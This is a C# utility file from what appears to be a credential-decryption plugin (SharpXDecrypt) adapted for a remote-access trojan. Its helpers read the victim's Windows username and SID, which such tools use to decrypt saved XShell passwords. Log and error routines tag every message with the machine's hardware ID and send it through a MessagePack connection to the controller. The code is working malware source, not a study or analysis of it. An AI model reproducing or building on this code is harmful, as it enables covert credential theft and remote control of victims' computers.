using System;
using Plugin;
using MessagePackLib.MessagePack;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

namespace SharpXDecrypt
{
    class Utils
    {
        public struct UserSID
        {
            public string Name;
            public string SID;
        }
        public static UserSID GetUserSID()
        {
            UserSID userSID;
            Log(Connection.Hwid + ": " + "[*] Start GetUserSID....");
            WindowsIdentity current = WindowsIdentity.GetCurrent();
            userSID.Name = current.Name.ToString().Split('\\')[1];
            userSID.SID = current.User.ToString();
            Log(Connection.Hwid + ": " + "  Username: " + userSID.Name);
            Log(Connection.Hwid + ": " + "  userSID: " + userSID.SID);
            return userSID;
        }
        public static string MidStrEx(string sourse, string startstr, string endstr)
        {
            string empty = string.Empty;
            int num = sourse.IndexOf(startstr);
            if (num == -1)
            {
                return empty;
            }
            string text = sourse.Substring(num + startstr.Length);
            int num2 = text.IndexOf(endstr);
            if (num2 == -1)
            {
                return empty;
            }
            return text.Remove(num2);
        }
        public static string ConvertByteToStringSid(Byte[] sidBytes)
        {
            StringBuilder strSid = new StringBuilder();
            strSid.Append("S-");
            try
            {
                // Add SID revision.
                strSid.Append(sidBytes[0].ToString());
                // Next six bytes are SID authority value.
                if (sidBytes[6] != 0 || sidBytes[5] != 0)
                {
                    string strAuth = String.Format
                        ("0x{0:2x}{1:2x}{2:2x}{3:2x}{4:2x}{5:2x}",
                        (Int16)sidBytes[1],
                        (Int16)sidBytes[2],
                        (Int16)sidBytes[3],
                        (Int16)sidBytes[4],
                        (Int16)sidBytes[5],
                        (Int16)sidBytes[6]);
                    strSid.Append("-");
                    strSid.Append(strAuth);
                }
                else
                {
                    Int64 iVal = (Int32)(sidBytes[1]) +
                        (Int32)(sidBytes[2] << 8) +
                        (Int32)(sidBytes[3] << 16) +
                        (Int32)(sidBytes[4] << 24);
                    strSid.Append("-");
                    strSid.Append(iVal.ToString());
                }

                // Get sub authority count...
                int iSubCount = Convert.ToInt32(sidBytes[7]);
                int idxAuth = 0;
                for (int i = 0; i < iSubCount; i++)
                {
                    idxAuth = 8 + i * 4;
                    UInt32 iSubAuth = BitConverter.ToUInt32(sidBytes, idxAuth);
                    strSid.Append("-");
                    strSid.Append(iSubAuth.ToString());
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Trace.Write(ex.Message);
                return "";
            }
            return strSid.ToString();
        }
        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}
